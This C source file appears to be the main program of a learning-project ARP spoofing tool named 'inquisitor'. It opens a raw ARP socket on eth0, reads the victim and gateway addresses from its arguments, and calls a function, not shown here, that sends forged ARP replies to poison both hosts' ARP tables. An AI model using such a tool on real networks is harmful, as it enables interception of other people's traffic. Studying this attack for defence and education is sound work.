#include "../inc/inquisitor.h"

void init_inqui(t_inquisitor *inquisitor, char **av) {
  inquisitor->ip_src = (int8_t *) av[1];
  inquisitor->mac_src = (int8_t *) av[2];
  inquisitor->ip_target = (int8_t *) av[3];
  inquisitor->mac_target = (int8_t *) av[4];
  inquisitor->sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
  if (inquisitor->sock == -1)
    error("socket", NULL, __FILE__, __LINE__, __func__);
  inquisitor->ifr.ifr_addr.sa_family = AF_INET;
  strncpy(inquisitor->ifr.ifr_name, "eth0", strlen("eth0") + 1);
  int retval = ioctl(inquisitor->sock, SIOCGIFADDR, &inquisitor->ifr);
  if (retval)
    error("ioctl", NULL, __FILE__, __LINE__, __func__);
  inquisitor->index = if_nametoindex("eth0");
  if (!inquisitor->index)
    error("ioctl", NULL, __FILE__, __LINE__, __func__);
  retval = ioctl(inquisitor->sock, SIOCGIFHWADDR, &inquisitor->ifr);
  if (retval)
    error("ioctl", NULL, __FILE__, __LINE__, __func__);
  mac_str_to_hex(inquisitor->mac_src, (uint8_t *) inquisitor->mac_src_byte_arr);
  mac_str_to_hex(inquisitor->mac_target, (uint8_t *) inquisitor->mac_target_byte_arr);

  dprintf(1, "\n");
}

void print_info(char **av, t_inquisitor *inquisitor) {
  dprintf(1, "BASE INFO:\n");
  dprintf(1, "MAC_SRC: %s\n", av[2]);
  dprintf(1, "IP_SRC: %s\n", av[1]);
  dprintf(1, "MAC_TARGET: %s\n", av[4]);
  dprintf(1, "IP_TARGET: %s\n", av[3]);
  dprintf(1, "\n");
  dprintf(1, "my ip: %s\n", inet_ntoa(((struct sockaddr_in *) &inquisitor->ifr.ifr_addr)->sin_addr));
  dprintf(1, "my mac address: %02x:%02x:%02x:%02x:%02x:%02x\n",
          (uint8_t) inquisitor->ifr.ifr_hwaddr.sa_data[0],
          (uint8_t) inquisitor->ifr.ifr_hwaddr.sa_data[1],
          (uint8_t) inquisitor->ifr.ifr_hwaddr.sa_data[2],
          (uint8_t) inquisitor->ifr.ifr_hwaddr.sa_data[3],
          (uint8_t) inquisitor->ifr.ifr_hwaddr.sa_data[4],
          (uint8_t) inquisitor->ifr.ifr_hwaddr.sa_data[5]);
}

int g_sock = 0;

int main(int ac, char **av) {
  t_inquisitor inquisitor;

  if (ac != 5)
    usage();
  init_inqui(&inquisitor, av);
  print_info(av, &inquisitor);
  g_sock = inquisitor.sock;
  send_fake_arp_packet(&inquisitor, 1); // alter target arp tables
  send_fake_arp_packet(&inquisitor, 2); // alter source arp tables
  close(inquisitor.sock); //cleanup
}
